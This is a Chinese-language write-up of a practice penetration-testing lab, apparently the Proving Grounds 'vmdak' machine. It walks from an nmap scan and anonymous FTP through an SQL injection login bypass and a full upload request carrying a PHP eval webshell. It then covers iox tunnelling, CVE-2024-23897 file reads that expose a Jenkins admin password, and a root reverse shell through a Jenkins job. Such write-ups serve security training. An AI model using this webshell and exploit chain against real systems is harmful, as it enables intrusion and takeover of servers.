OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   79.32 ms 192.168.45.1
2   79.27 ms 192.168.45.254
3   79.34 ms 192.168.251.1
4   79.44 ms 192.168.119.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.17 seconds
```

nmap结果显示存在ftp匿名登录

```
┌──(root㉿cyborg)-[/home/…/oscp/pg/linux/vmdak]
└─# ftp 192.168.119.103
Connected to 192.168.119.103.
220 (vsFTPd 3.0.5)
Name (192.168.119.103:cyborg): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

![image-20250302155737209](./PG_linux.assets/image-20250302155737209.png)

是一个xml文件，没发现明显的凭证信息，先放着，看nmap结果还开放了80http和9443https，80是apache默认页面，9443页面有应用

![image-20250302160036656](./PG_linux.assets/image-20250302160036656.png)

右上角有一个后台登录页面，检索漏洞发现一个sql注入

![image-20250302160403912](./PG_linux.assets/image-20250302160403912.png)

使用万能密码成功登录系统

![image-20250302160337190](./PG_linux.assets/image-20250302160337190.png)

在后台添加用户这里添加用户可以上传头像，但是直接上传不行，需要保存的时候拦截包，将php文件的Content-Type:改为image/jpg，或者发下面的数据包（修改admin头像在这里应该也可以，我没试了

```
POST /Admin/add-admin.php HTTP/1.1
Host: 192.168.119.103:9443
Cookie: PHPSESSID=r90vr8b3iil3k59rt5ferbju48
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------66692625221901068043240654100
Content-Length: 878
Origin: https://192.168.119.103:9443
Referer: https://192.168.119.103:9443/Admin/add-admin.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive


-----------------------------66692625221901068043240654100
Content-Disposition: form-data; name="txtusername"


admin123
-----------------------------66692625221901068043240654100
Content-Disposition: form-data; name="txtfullname"


admin123
-----------------------------66692625221901068043240654100
Content-Disposition: form-data; name="txtpassword"


admin123
-----------------------------66692625221901068043240654100
Content-Disposition: form-data; name="txtphone"


admin123
-----------------------------66692625221901068043240654100
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpg


GIF89a
<?php @eval($_REQUEST['shell']); ?>

-----------------------------66692625221901068043240654100
Content-Disposition: form-data; name="btncreate"




-----------------------------66692625221901068043240654100--

```

![image-20250302161811447](./PG_linux.assets/image-20250302161811447.png)

![image-20250302161711662](./PG_linux.assets/image-20250302161711662.png)

右键打开图像地址成功getshell

![image-20250302161911202](./PG_linux.assets/image-20250302161911202.png)

反弹shell

![image-20250302162353871](./PG_linux.assets/image-20250302162353871.png)

开放了8080，并且是root身份运行的，但外部无法访问

![image-20250302163339898](./PG_linux.assets/image-20250302163339898.png)

![image-20250302165441374](./PG_linux.assets/image-20250302165441374.png)

使用iox搭建隧道

```
kali运行(配置socks5代理，127.0.0.1:1080)
./iox proxy -l 2222 -l 1080
靶机运行(192.168.45.184是攻击机IP)
./iox proxy -r 192.168.45.184:2222
```

浏览器socks5代理到本机1080端口，然后访问127.0.0.1:8080即可访问到靶机的8080端口，是个Jenkins页面![image-20250302163900966](./PG_linux.assets/image-20250302163900966.png)

刚开始刚好通过ftp获得了Jenkins的一些配置信息

![image-20250302164154836](./PG_linux.assets/image-20250302164154836.png)

注意一个配置，配置了匿名登录，但是失败了

```
<denyAnonymousReadAccess>false</denyAnonymousReadAccess>
```

一开始用的searchsploit，搜到的漏洞有点老了，bing搜索找到一个任意文件读取(CVE-2024-23897)：https://github.com/godylockz/CVE-2024-23897

成功读取

![image-20250302172030195](./PG_linux.assets/image-20250302172030195.png)

拿到proof和local（之前能低权限RCE，`ls /home`看一下找到用户直接读取local就行）

![image-20250302172118710](./PG_linux.assets/image-20250302172118710.png)

这里还是想读取/root/.jenkins/secrets/initialAdminPassword登录系统试试，读取到密码`140ef31373034d19a77baa9c6b84a200`

![image-20250302172236416](./PG_linux.assets/image-20250302172236416.png)

创建一个job，在这里启动shell，输入反弹shell命令

![image-20250302172941128](./PG_linux.assets/image-20250302172941128.png)

save后点击build now即可收到root的shell

![image-20250302172857267](./PG_linux.assets/image-20250302172857267.png)



